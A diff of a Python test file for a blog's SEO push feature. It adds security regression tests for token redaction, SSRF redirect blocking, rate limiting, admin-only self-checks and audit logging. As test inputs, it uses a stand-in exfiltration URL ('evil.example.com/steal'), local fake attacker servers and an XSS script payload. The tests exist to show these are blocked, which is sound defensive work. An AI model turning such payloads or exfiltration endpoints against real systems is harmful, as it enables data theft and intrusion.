@@ -9,12 +9,28 @@
 """
 import secrets
 
+import pytest
+
 from models import (db, Post, Setting, User, SeoSubmission,
                     ROLE_SUPER, ROLE_ADMIN)
 from _time import utcnow
 from utils import _sign_csrf
 
 import seo_push
+
+
+@pytest.fixture(autouse=True)
+def _clear_rate_limit():
+    """每个用例前后清空限流计数。
+
+    推送接口自 v3.19.1 起有「3 次 / 5 分钟」限流（按客户端 key，测试里恒为
+    127.0.0.1）。不隔离的话多个用例共用同一份额度，套件会变成**顺序相关**
+    （单独跑绿、连跑红——本文件就踩到过）。故统一在用例前后清空。
+    """
+    from utils import _RATE
+    _RATE.clear()
+    yield
+    _RATE.clear()
 
 
 def _uid():
@@ -349,7 +365,7 @@ def test_blocked_host_never_sends(monkeypatch):
     monkeypatch.setattr(urllib.request, "urlopen",
                         lambda *a, **kw: opened.append(a) or (_ for _ in ()).throw(
                             AssertionError("不该发起请求")))
-    st, txt = seo_push._http_post("http://evil.example.com/steal", b"x")
+    st, txt, _ct = seo_push._http_post("http://evil.example.com/steal", b"x")
     assert st == 0 and "blocked-host" in txt
     assert not opened
 
@@ -473,17 +489,43 @@ def test_response_text_strips_token(monkeypatch):
     monkeypatch.setattr(
         seo_push, "_http_post",
         lambda *a, **k: (401, '{"error":401,"message":"bad",'
-                              '"url":"http://data.zz.baidu.com/urls?token=%s"}' % token))
+                              '"url":"http://data.zz.baidu.com/urls?token=%s"}' % token,
+                         "application/json"))
     st, resp, _ = seo_push.push_baidu(["https://x.cn/post/a"], token, "https://x.cn")
     assert st == "fail"
     assert token not in resp, "响应回显里的 token 必须被抹掉，否则页面/日志泄露密钥"
+
+
+def test_redact_happens_before_truncation(monkeypatch):
+    """**脱敏必须在截断之前**（v3.19.1 修的缺陷）。
+
+    v3.19.0 是 `_clean(text).replace(token, "***")`——先截断到 500 字符再替换。
+    若 token 出现在第 500 字符之后，替换不再命中，密钥会入库并上屏。
+    这里把 token 放在 600 字符之后，断言仍然被抹掉。
+    """
+    token = "TOKEN" + secrets.token_hex(12)
+    # 构造：前 600 字符是噪音，token 落在截断点之后
+    padded = "x" * 600
+    monkeypatch.setattr(
+        seo_push, "_http_post",
+        lambda *a, **k: (401, padded + " token=" + token, "application/json"))
+    st, resp, _ = seo_push.push_baidu(["https://x.cn/post/a"], token, "https://x.cn")
+    assert st == "fail"
+    assert token not in resp, \
+        "token 落在截断点之后仍必须被抹掉（先脱敏、后截断）"
+    assert token[:24] not in resp, "整串之外还要抹前缀片段"
+
+    # 直接测 _clean 的顺序契约
+    out = seo_push._clean("y" * 600 + " tok=" + token, secrets=(token,))
+    assert token not in out
 
 
 def test_indexnow_response_strips_key(monkeypatch):
     """IndexNow 的 key 同样不得出现在入库文本里。"""
     key = "abcdef1234567890"
     monkeypatch.setattr(seo_push, "_http_post",
-                        lambda *a, **k: (400, '{"error":"invalid key %s"}' % key))
+                        lambda *a, **k: (400, '{"error":"invalid key %s"}' % key,
+                                         "application/json"))
     st, resp, _ = seo_push.push_indexnow(["https://x.cn/post/a"], key, "https://x.cn")
     assert st == "fail" and key not in resp
 
@@ -498,12 +540,14 @@ def test_clean_truncates_and_flattens():
 def test_baidu_quota_status(monkeypatch):
     """配额耗尽必须单独成 quota 档（否则用户会误以为是 token 填错）。"""
     monkeypatch.setattr(seo_push, "_http_post",
-                        lambda *a, **k: (200, '{"error":400,"message":"over quota"}'))
+                        lambda *a, **k: (200, '{"error":400,"message":"over quota"}',
+                                         "application/json"))
     st, _resp, remaining = seo_push.push_baidu(["https://x.cn/post/a"], "t", "https://x.cn")
     assert st == "quota"
     # remaining 为 0 也应归 quota
     monkeypatch.setattr(seo_push, "_http_post",
-                        lambda *a, **k: (200, '{"success":0,"remaining":0}'))
+                        lambda *a, **k: (200, '{"success":0,"remaining":0}',
+                                         "application/json"))
     st2, _r2, rem2 = seo_push.push_baidu(["https://x.cn/post/a"], "t", "https://x.cn")
     assert st2 == "quota" and rem2 == 0
 
@@ -511,9 +555,43 @@ def test_baidu_quota_status(monkeypatch):
 def test_baidu_ok_parses_remaining(monkeypatch):
     """成功必须解析出 remaining 供页面展示配额。"""
     monkeypatch.setattr(seo_push, "_http_post",
-                        lambda *a, **k: (200, '{"success":1,"remaining":998}'))
+                        lambda *a, **k: (200, '{"success":1,"remaining":998}',
+                                         "application/json"))
     st, _resp, remaining = seo_push.push_baidu(["https://x.cn/post/a"], "t", "https://x.cn")
     assert st == "ok" and remaining == 998
+
+
+def test_baidu_non_json_200_is_not_success(monkeypatch):
+    """**HTTP 200 但响应不是 JSON → 必须判 fail，不得记成功**（v3.19.1）。
+
+    v3.19.0 的实现是 `return ("ok" if status == 200 else "fail")`——于是一个
+    伪造的 200（或被劫持链路上的 HTML 错误页）就能让控制台显示「成功」，
+    还会写入虚假配额。这是「半盲 SSRF」的放大器之一。
+    """
+    monkeypatch.setattr(seo_push, "_http_post",
+                        lambda *a, **k: (200, "<html>captive portal</html>", "text/html"))
+    st, resp, _rem = seo_push.push_baidu(["https://x.cn/post/a"], "t", "https://x.cn")
+    assert st == "fail", "非 JSON 的 200 不得记成功，实得 %r" % st
+
+    # Content-Type 明确非 JSON 时，即使 body 能解析出 JSON 也判 fail
+    monkeypatch.setattr(seo_push, "_http_post",
+                        lambda *a, **k: (200, '{"success":5,"remaining":10}', "text/html"))
+    st2, _r2, _rem2 = seo_push.push_baidu(["https://x.cn/post/a"], "t", "https://x.cn")
+    assert st2 == "fail", "Content-Type 非 JSON 时不认成功"
+
+
+def test_response_only_keeps_whitelisted_fields(monkeypatch):
+    """入库/上屏的响应只保留白名单字段（v3.19.1：防内容回显）。"""
+    monkeypatch.setattr(
+        seo_push, "_http_post",
+        lambda *a, **k: (200, '{"success":2,"remaining":7,'
+                              '"injected":"<script>alert(1)</script>",'
+                              '"arbitrary":"whatever"}', "application/json"))
+    st, resp, _rem = seo_push.push_baidu(["https://x.cn/post/a"], "t", "https://x.cn")
+    assert st == "ok"
+    assert "script" not in resp, "非白名单字段不得入库/上屏"
+    assert "arbitrary" not in resp
+    assert "remaining" in resp and "success" in resp
 
 
 # ===========================================================================
@@ -536,8 +614,15 @@ def test_preview_reuses_existing_views(app, client):
             _cleanup(user_ids=[uid])
 
 
-def test_selfcheck_flags_human_misjudgement(app, client):
-    """自检必须同时验证抓取方与**真人**——后者才是防生产事故的关键项。"""
+def test_selfcheck_calls_the_real_gate(app, client):
+    """自检必须**真调闸门函数**，且真人项不得被判成「可索引壳页」。
+
+    **v3.19.1 修正（原 test_selfcheck_flags_human_misjudgement）**：
+    v3.19.0 的 `/admin/seo/selfcheck` 用本地重写的公式复刻闸门
+    （缺 `is_internal_referer()` 与 `Sec-Fetch-Dest: document` 两道否决），
+    而 `seo_shell_ua` 导入后从未调用——闸门改了、自检页仍显示全绿。
+    现在它直接调 `seo_shell_ua()`，这条测试同时锁住判定口径与真人安全。
+    """
     with app.app_context():
         _mkbase()
         u = _mkuser(ROLE_SUPER)
@@ -549,13 +634,21 @@ def test_selfcheck_flags_human_misjudgement(app, client):
         by_expect = {}
         for c in d["checks"]:
             by_expect.setdefault(c["expect"], []).append(c)
-        assert len(by_expect.get("shell", [])) == 2, "应有 2 个抓取方用例"
-        assert len(by_expect.get("spa", [])) == 2, "应有 2 个真人用例"
+        assert len(by_expect.get("shell", [])) == 3, \
+            "应有 3 个抓取方用例（百度 / Google / 微信）"
+        assert len(by_expect.get("noindex", [])) == 1, "应有 1 个真人用例（QQ）"
+        assert len(by_expect.get("404", [])) == 1, "应有 1 个普通浏览器用例（Chrome）"
         assert all(c["ok"] for c in d["checks"]), \
             "闸门判定与预期不符：%r" % d["checks"]
+        # 真人两条**绝不能**是可索引壳页
+        for label in ("QQ", "Chrome"):
+            c = [x for x in d["checks"] if label in x["label"]][0]
+            assert c["allow"] is False, "%s 不该被放行" % label
+            assert c["got"] in ("noindex", "404"), \
+                "%s 被判成「可索引壳页」= 生产事故" % label
         qq = [c for c in d["checks"] if "QQ" in c["label"]][0]
-        assert qq["got"] == "spa" and qq["human_signal"] is True, \
-            "QQ 内置浏览器真人必须被判为真人（否则真人会看到空白壳页）"
+        assert qq["got"] == "noindex" and qq["reason"].startswith("human"), \
+            "QQ 内置浏览器真人必须被判为真人（否则打不开页面）"
     finally:
         with app.app_context():
             _cleanup(user_ids=[uid], drop_base=True)
@@ -577,24 +670,46 @@ def test_selfcheck_not_configured(app, client):
             _cleanup(user_ids=[uid], drop_base=True)
 
 
-def test_status_endpoint_shape(app, client):
-    """状态接口返回 counts 与 quota，供页面轮询渲染。"""
+def test_console_and_status_never_expose_token(app, client):
+    """收录页与状态接口都不得出现 token 的**明文或密文**。
+
+    **v3.19.1 修正**：原断言是
+    `assert "token" not in str(d).lower() or "baidu_token" not in str(d)`
+    —— 两个子句都只查**键名**，且用 `or` 连接，任一成立即通过；把 token 的
+    **值**原样吐给页面时第一个子句为真 → 断言恒成立（等于空转，报告 2.7-1）。
+    现在真的存一个凭据，断言明文与密文都不出现在两个响应里。
+    """
+    plain = "SECRET" + secrets.token_hex(8)
     with app.app_context():
+        import backup_settings as bs
         u = _mkuser(ROLE_SUPER)
         uid = u.id
+        enc = bs.encrypt_secret(plain)
+        Setting.query.filter_by(key="seo_baidu_token_enc").delete()
+        db.session.add(Setting(key="seo_baidu_token_enc", value=enc))
         pid = _mkpost().id
         db.session.add(SeoSubmission(post_id=pid, engine="baidu", status="ok", response="x"))
         db.session.commit()
     try:
         _auth(app, client, uid)
-        d = client.get("/admin/seo/status").get_json()
-        assert "counts" in d and "rows" in d and "quota" in d
-        assert d["counts"]["ok"] >= 1
-        # 状态接口绝不能泄露 token
-        assert "token" not in str(d).lower() or "baidu_token" not in str(d)
+
+        page = client.get("/admin/seo").get_data(as_text=True)
+        assert plain not in page, "收录页泄露了 token 明文"
+        assert enc not in page, "收录页泄露了 token 密文"
+        assert "••••" in page, "有值时应收敛成掩码回显"
+
+        d = client.get("/admin/seo/status")
+        assert d.status_code == 200
+        body = d.get_data(as_text=True)
+        assert plain not in body, "状态接口泄露了 token 明文"
+        assert enc not in body, "状态接口泄露了 token 密文"
+
+        js = d.get_json()
+        assert "counts" in js and "rows" in js and "quota" in js
+        assert js["counts"]["ok"] >= 1
     finally:
         with app.app_context():
-            _cleanup(post_ids=[pid], user_ids=[uid])
+            _cleanup(post_ids=[pid], user_ids=[uid], drop_keys=True)
 
 
 def test_console_page_renders(app, client):
@@ -633,13 +748,342 @@ def test_console_page_renders_without_site_url(app, client):
             _cleanup(user_ids=[uid], drop_base=True)
 
 
-def test_shell_check_endpoint_untouched(app, client):
-    """阶段 1 的 /api/seo/shell-check 必须仍可用（本轮不改它的语义）。"""
+def test_shell_check_requires_super_and_never_goes_out(app, client, monkeypatch):
+    """`/api/seo/shell-check` 现在：① 需超管 ② **零出网** ③ 经通道不出 3xx。
+
+    **v3.19.1 修正（原 test_shell_check_endpoint_untouched）**：
+    v3.19.0 该端点**匿名可调**且内部用 `urllib` 回打公网地址 4 次（自请求放大面，
+    占住 worker 等自己返回）；而旧测试只断言 `200 or 400` 且**不 stub urlopen**——
+    是全库唯一可能真出网的测试（报告 2.7-3）。现在把 urlopen 打成「命中即抛错」，
+    既验证零出网，也保证这条测试永远不再触网。
+    """
+    import urllib.request
+
+    def _boom(*a, **k):
+        raise AssertionError("自检端点不得发起任何网络请求（应走 test_request_context）")
+
+    monkeypatch.setattr(urllib.request, "urlopen", _boom)
     with app.app_context():
         pid = _mkpost().id
+        _mkbase()
+        u = _mkuser(ROLE_SUPER)
+        uid = u.id
     try:
-        r = client.get("/api/seo/shell-check?slug=whatever")
-        assert r.status_code in (200, 400), "既有端点行为不应被本轮改动影响"
+        # 匿名 → 403（v3.19.0 是 200，任何访客都能触发 4 次自请求）
+        r0 = client.get("/api/seo/shell-check?slug=x")
+        assert r0.status_code == 403, "自检端点必须只给超管，实得 %s" % r0.status_code
+
+        # 超管 → 200，且全部在本地请求上下文里完成（零出网）
+        _auth(app, client, uid)
+        r = client.get("/api/seo/shell-check")
+        assert r.status_code == 200, r.get_data(as_text=True)[:200]
+        d = r.get_json()
+        assert d["all_ok"] is True, d.get("checks")
+        for c in d["checks"]:
+            assert c["would_loop"] is False, \
+                "经通道出现 3xx = 302 环：%r" % c
+            assert c["status"] in (200, 404), \
+                "经通道只允许 200/404：%r" % c
     finally:
         with app.app_context():
-            _cleanup(post_ids=[pid])
+            _cleanup(post_ids=[pid], user_ids=[uid], drop_base=True)
+
+
+# ===========================================================================
+# 九、v3.19.1 复审修复项（报告 2.2 / 2.4 / 2.5 / 2.8 / 2.9）
+# ===========================================================================
+def test_redirect_is_not_followed(monkeypatch):
+    """**出站禁跟随重定向**（报告 2.2，半盲 SSRF）。
+
+    用两个本地 HTTP 服务复现：白名单里的第一个返回 `302 → 第二个`，
+    断言「第二个从未收到请求」。v3.19.0 用默认 opener，urllib 会把 POST 降级成
+    GET 跟过去——本地实测确实发生（这正是报告认定的 SSRF 面）。
+
+    做法：把白名单临时改成只放行第一个服务，既复现真实路径，
+    又不必真的连到 `data.zz.baidu.com`。
+    """
+    import http.server
+    import socketserver
+    import threading as _th
+
+    hits = []
+    evil_port = [0]
+
+    class _Redirector(http.server.BaseHTTPRequestHandler):
+        def do_POST(self):
+            hits.append("redirector:POST")
+            self.send_response(302)
+            self.send_header("Location", "http://127.0.0.1:%d/steal" % evil_port[0])
+            self.end_headers()
+
+        def log_message(self, *a):
+            pass
+
+    class _Evil(http.server.BaseHTTPRequestHandler):
+        def do_GET(self):
+            hits.append("EVIL:GET")
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(b'{"leaked":"internal"}')
+
+        def do_POST(self):
+            hits.append("EVIL:POST")
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(b"evil")
+
+        def log_message(self, *a):
+            pass
+
+    evil = socketserver.TCPServer(("127.0.0.1", 0), _Evil)
+    evil_port[0] = evil.server_address[1]
+    red = socketserver.TCPServer(("127.0.0.1", 0), _Redirector)
+    rp = red.server_address[1]
+    for s in (red, evil):
+        _th.Thread(target=s.serve_forever, daemon=True).start()
+    try:
+        monkeypatch.setattr(seo_push, "_is_allowed_url",
+                            lambda u: ("127.0.0.1:%d" % rp) in u)
+        st, _txt, _ct = seo_push._http_post("http://127.0.0.1:%d/urls" % rp, b"urls=a",
+                                            timeout=5)
+        assert "redirector:POST" in hits, "请求本身应发出"
+        assert not any(h.startswith("EVIL") for h in hits), \
+            "**不得跟随 302 到白名单外主机**（半盲 SSRF）——实得 %r" % hits
+        assert st in (301, 302, 303, 307, 308), \
+            "3xx 应原样返回给调用方落 fail，实得 %r" % st
+    finally:
+        red.shutdown()
+        evil.shutdown()
+
+
+def test_thread_exception_marks_fail_instead_of_stuck_pending(app, monkeypatch):
+    """**后台线程异常必须落 fail，不能永久停在「排队中」**（报告 2.4）。
+
+    v3.19.0 有两层 `except Exception: pass`：一旦 `submit_posts` 抛出，
+    这批记录永远显示 ⏳ 排队中，页面轮询永远等不到结果，日志里也没有痕迹。
+
+    做法：把 `submit_posts` 换成「一调就抛」，并把 Thread 换成**同步执行**的替身
+    （否则断言会与真线程竞态）。
+    """
+    def _boom(*a, **k):
+        raise ValueError("模拟后台线程崩溃")
+
+    class _SyncThread:
+        def __init__(self, target=None, args=(), daemon=None, **kw):
+            self._t, self._a = target, args
+
+        def start(self):
+            self._t(*self._a)          # 同步跑完，便于断言
+
+    monkeypatch.setattr(seo_push, "submit_posts", _boom)
+    monkeypatch.setattr(seo_push.threading, "Thread", _SyncThread)
+    with app.app_context():
+        _mkbase()
+        pid = _mkpost().id
+    try:
+        with app.app_context():
+            seo_push.enqueue([pid], "baidu")
+            row = SeoSubmission.query.filter_by(post_id=pid, engine="baidu").first()
+            assert row is not None
+            assert row.status == "fail", \
+                "线程异常必须落 fail，不能停在 pending（实得 %s）" % row.status
+            assert "异常" in (row.response or ""), "应写明是线程异常：%r" % row.response
+    finally:
+        with app.app_context():
+            _cleanup(post_ids=[pid], drop_base=True)
+
+
+def test_spawn_failure_marks_fail_and_reports_zero(app, monkeypatch):
+    """`_spawn` 起不来线程时：落 fail + `enqueue` 返回 0（页面不再假报「已入队」）。"""
+    monkeypatch.setattr(seo_push, "_spawn", lambda *a, **kw: False)
+    with app.app_context():
+        _mkbase()
+        pid = _mkpost().id
+    try:
+        with app.app_context():
+            n = seo_push.enqueue([pid], "baidu")
+            assert n == 0, "起线程失败必须返回 0"
+            row = SeoSubmission.query.filter_by(post_id=pid, engine="baidu").first()
+            assert row is not None and row.status == "fail"
+    finally:
+        with app.app_context():
+            _cleanup(post_ids=[pid], drop_base=True)
+
+
+def test_push_audit_records_ip(app, client, monkeypatch):
+    """推送审计必须带来源 IP（报告 2.4）。
+
+    v3.19.0 手搓 `AuditLog(..., ip="")`，`get_client_ip` 导入了却没用——
+    「谁、从哪个 IP 烧了配额」事后查不到。
+
+    测法要点：后台线程体在**请求上下文之外**执行（真实情形如此），
+    所以断言 IP 非空才能真正证明「IP 是在请求线程里捕获后传进来的」。
+    做法：把 Thread 换成**只记录不执行**的替身，之后在 app_context 里手动跑线程体。
+    """
+    from models import AuditLog
+
+    captured = {}
+
+    class _CapturingThread:
+        def __init__(self, target=None, args=(), daemon=None, **kw):
+            captured["target"] = target
+            captured["args"] = args
+            captured["daemon"] = daemon
+
+        def start(self):
+            captured["started"] = True
+
+    monkeypatch.setattr(seo_push.threading, "Thread", _CapturingThread)
+    monkeypatch.setattr(seo_push, "push_baidu", lambda *a, **k: ("ok", "success 1", 998))
+    with app.app_context():
+        _mkbase()
+        u = _mkuser(ROLE_SUPER)
+        uid = u.id
+        uname = u.username
+        pid = _mkpost().id
+    try:
+        tok = _auth(app, client, uid)
+        r = client.post("/admin/seo/push",
+                        data={"engine": "baidu", "post_id": str(pid), "csrf_token": tok},
+                        follow_redirects=False)
+        assert r.status_code == 302
+        assert captured.get("started"), "应启动后台线程"
+        assert captured.get("daemon") is True
+
+        # 在**请求上下文之外**执行线程体（= 真实的后台线程情形）
+        with app.app_context():
+            captured["target"](*captured["args"])
+            row = (AuditLog.query.filter_by(action="seo_push")
+                   .order_by(AuditLog.id.desc()).first())
+            assert row is not None, "必须写 seo_push 审计"
+            assert row.username == uname
+            assert (row.ip or "") != "", \
+                "审计 IP 为空——说明 IP 没有在请求线程里捕获（v3.19.0 的缺陷）"
+    finally:
+        with app.app_context():
+            AuditLog.query.filter_by(action="seo_push").delete(synchronize_session=False)
+            db.session.commit()
+            _cleanup(post_ids=[pid], user_ids=[uid], drop_base=True)
+
+
+def test_push_endpoint_is_rate_limited(app, client, monkeypatch):
+    """推送接口必须限流（报告 2.5）：百度配额用完不可逆，连点会打光配额。
+
+    注意：这里必须把 `_spawn` 替成 no-op。否则会起**真实后台线程**，而线程
+    可能在用例清理**之后**才写回记录 → 留下残留行 + post id 被复用 → 后续用例
+    撞 `(post_id, engine)` 唯一约束（本文件踩到过）。
+    """
+    monkeypatch.setattr(seo_push, "_spawn", lambda *a, **kw: True)
+    with app.app_context():
+        _mkbase()
+        u = _mkuser(ROLE_SUPER)
+        uid = u.id
+        pids = [_mkpost().id for _ in range(3)]
+    try:
+        tok = _auth(app, client, uid)
+        for pid in pids + [pids[0], pids[1]]:
+            client.post("/admin/seo/push",
+                        data={"engine": "baidu", "post_id": str(pid), "csrf_token": tok},
+                        follow_redirects=False)
+        with app.app_context():
+            rows = SeoSubmission.query.filter_by(engine="baidu").count()
+            assert rows <= 3, \
+                "5 分钟内超过 3 次仍入队 = 限流没生效（实得 %d 行）" % rows
+    finally:
+        with app.app_context():
+            _cleanup(post_ids=pids, user_ids=[uid], drop_base=True)
+
+
+def test_push_refused_while_another_batch_pending(app, client):
+    """已有 pending 批次时必须拒绝新推送（在飞去重，报告 2.5）。"""
+    with app.app_context():
+        _mkbase()
+        u = _mkuser(ROLE_SUPER)
+        uid = u.id
+        p1 = _mkpost()
+        p2 = _mkpost()
+        p1id, p2id = p1.id, p2.id
+        # 防御：本用例假设「该 post 还没有推送记录」，但 SQLite 会复用被删行的
+        # rowid（前面用例删过文章后，新文章可能拿到同一个 id）——先清干净。
+        SeoSubmission.query.filter(
+            SeoSubmission.post_id.in_([p1id, p2id])).delete(synchronize_session=False)
+        db.session.add(SeoSubmission(post_id=p1id, engine="baidu", status="pending"))
+        db.session.commit()
+    try:
+        tok = _auth(app, client, uid)
+        r = client.post("/admin/seo/push",
+                        data={"engine": "baidu", "post_id": str(p2id), "csrf_token": tok},
+                        follow_redirects=False)
+        assert r.status_code == 302
+        with app.app_context():
+            rows = SeoSubmission.query.filter_by(post_id=p2id, engine="baidu").all()
+            assert rows == [], "有 pending 批次时不得再入队新推送"
+    finally:
+        with app.app_context():
+            _cleanup(post_ids=[p1id, p2id], user_ids=[uid], drop_base=True)
+
+
+def test_keylocation_is_validated():
+    """`keyLocation` 必须由合法 site_url 构造（报告 2.9）。
+
+    `host` 来自后台可填的 `site_url`：填成别的域名等于把 key 的 URL 路径
+    告知那个域名的持有者；带 query/fragment/userinfo 会拼出非法或钓鱼式 URL。
+    """
+    assert seo_push._keylocation("https://www.llhhy.cn", "abc12345") == \
+        "https://www.llhhy.cn/abc12345.txt"
+    # 带子路径：保留 path（站点可能部署在子目录）
+    assert seo_push._keylocation("https://x.cn/blog", "abc12345") == \
+        "https://x.cn/blog/abc12345.txt"
+    for bad in ("", "ftp://x.cn", "https://", "https://x.cn?a=1",
+                "https://x.cn#f", "https://user:pw@x.cn", "not a url"):
+        assert seo_push._keylocation(bad, "abc12345") == "", \
+            "非法 site_url 必须被拒：%r" % bad
+
+
+def test_indexnow_bad_key_or_host_fails_without_network(monkeypatch):
+    """key 格式非法 / site_url 非法时，IndexNow 必须**不出网**直接 fail。"""
+    import urllib.request
+    monkeypatch.setattr(urllib.request, "urlopen",
+                        lambda *a, **k: (_ for _ in ()).throw(
+                            AssertionError("不该发起请求")))
+    st, resp, _ = seo_push.push_indexnow(["https://x.cn/post/a"], "bad key!!", "https://x.cn")
+    assert st == "fail" and "key" in resp
+    st2, resp2, _ = seo_push.push_indexnow(["https://x.cn/post/a"],
+                                           "abcdef1234567890", "ftp://x.cn")
+    assert st2 == "fail" and "site_url" in resp2
+
+
+def test_purge_removes_seo_submission_rows(app, client):
+    """彻底删除文章时必须清掉它的推送记录（报告 2.8）。
+
+    SQLite 默认不启用外键（`app.py` 未设 `PRAGMA foreign_keys=ON`），
+    所以 `seo_submission` 的 FK 不会级联——不显式删就留下 `post_id` 悬空行。
+    """
+    from models import RecycleBin
+
+    with app.app_context():
+        u = _mkuser(ROLE_ADMIN)
+        uid = u.id
+        p = _mkpost()
+        pid = p.id
+        db.session.add(SeoSubmission(post_id=pid, engine="baidu", status="ok", response="x"))
+        rb = RecycleBin(post_id=pid, title=p.title)
+        db.session.add(rb)
+        db.session.commit()
+        rid = rb.id
+    try:
+        tok = _auth(app, client, uid)
+        r = client.post("/admin/recycle-bin/%d/purge" % rid,
+                        data={"csrf_token": tok},
+                        follow_redirects=False)
+        assert r.status_code in (200, 302), r.status_code
+        with app.app_context():
+            assert Post.query.get(pid) is None, "文章应已被彻底删除"
+            left = SeoSubmission.query.filter_by(post_id=pid).all()
+            assert left == [], "彻底删除后不得留下孤儿推送记录：%r" % left
+    finally:
+        with app.app_context():
+            SeoSubmission.query.filter_by(post_id=pid).delete(synchronize_session=False)
+            RecycleBin.query.filter_by(id=rid).delete(synchronize_session=False)
+            Post.query.filter_by(id=pid).delete(synchronize_session=False)
+            _cleanup(post_ids=[pid], user_ids=[uid])
